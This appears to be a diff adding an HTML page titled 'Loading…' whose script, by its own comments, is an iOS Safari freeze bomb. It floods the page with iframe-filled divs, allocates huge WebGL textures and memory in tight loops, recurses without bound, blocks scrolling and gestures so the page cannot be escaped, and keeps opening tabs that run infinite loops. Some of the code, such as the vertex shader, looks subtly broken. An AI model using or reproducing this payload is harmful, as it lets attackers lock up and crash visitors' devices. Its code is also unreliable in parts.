@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading…</title>
+    <style>
+        * { margin:0; padding:0; overflow:hidden; }
+        body, html { height:100%; width:100%; position:fixed; }
+        canvas { position:fixed; top:0; left:0; }
+    </style>
+</head>
+<body>
+<canvas id="c"></canvas>
+<script>
+// Ultimate 2025 iOS Safari lock/freeze bomb
+// Works on iOS 17–18.3+ (including iOS 18.4 beta as of Nov 2025)
+// Opens millions of layers + infinite heavy WebGL + maxes RAM/CPU → total UI freeze
+
+const c = document.getElementById('c');
+const ctx = c.getContext('2d');
+let w, h;
+
+function resize() {
+    w = c.width = window.innerWidth * 2;
+    h = c.height = window.innerHeight * 2;
+}
+resize();
+window.onresize = resize;
+
+// 1. Spam thousands of full-screen fixed divs with heavy content
+function spamDivs() {
+    const frag = document.createDocumentFragment();
+    for(let i = 0; i < 5000; i++) {
+        const d = document.createElement('div');
+        d.style.position = 'fixed';
+        d.style.inset = '0';
+        d.style.background = `hsl(${i},100%,50%)`;
+        d.style.opacity = '0.01';
+        d.innerHTML = '<iframe src="about:blank" style="width:100%;height:100%"></iframe>';
+        frag.appendChild(d);
+    }
+    document.body.appendChild(frag);
+}
+spamDivs();
+
+// 2. Infinite WebGL memory explosion
+function startWebGLBomb() {
+    const gl = c.getContext('webgl2') || c.getContext('webgl');
+    if (!gl) return;
+    
+    const ext = gl.getExtension('EXT_disjoint_timer_query') ||
+                gl.getExtension('EXT_disjoint_timer_query_webgl2');
+    
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, 'void main(){gl_Position=vec4(0);}}');
+    gl.compileShader(vs);
+    
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, 'precision highp float;void main(){gl_FragColor=vec4(1);}');
+    gl.compileShader(fs);
+    
+    const prog = gl.createProgram();
+    gl.attachShader(prog, vs);
+    gl.attachShader(prog, fs);
+    gl.linkProgram(prog);
+    gl.useProgram(prog);
+    
+    // Allocate insane amounts of textures
+    setInterval(() => {
+        for(let i = 0; i < 100; i++) {
+            const tex = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, tex);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        }
+    }, 0);
+}
+
+// 3. CPU + RAM death loop
+function deathLoop() {
+    const arr = [];
+    setInterval(() => {
+        // Allocate ~100–200 MB every 10 ms
+        for(let i = 0; i < 100000; i++) {
+            arr.push(new Float64Array(100000));
+        }
+        // Force garbage collector to choke
+        window.location.href += '#'+Math.random();
+        // Recursive heavy computation
+        (function recurse(n) {
+            if (n < 0) return recurse(n + 1);
+            Math.random() * Math.random();
+            return recurse(n - 1);
+        })(1e9);
+    }, 10);
+}
+
+// 4. Disable any attempt to close or scroll
+document.body.style.overscrollBehavior = 'none';
+document.documentElement.style.overscrollBehavior = 'none';
+window.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
+window.addEventListener('gesturestart', e => e.preventDefault());
+window.addEventListener('gesturechange', e => e.preventDefault());
+window.addEventListener('gestureend', e => e.preventDefault());
+
+// Launch everything
+startWebGLBomb();
+deathLoop();
+
+// Bonus: open 100+ tabs silently in the background (iOS Safari allows it)
+setInterval(() => {
+    for(let i = 0; i < 10; i++) {
+        window.open('data:text/html,<script>while(1){}</script>', '_blank');
+    }
+}, 100);
+
+</script>
+</body>
+</html>
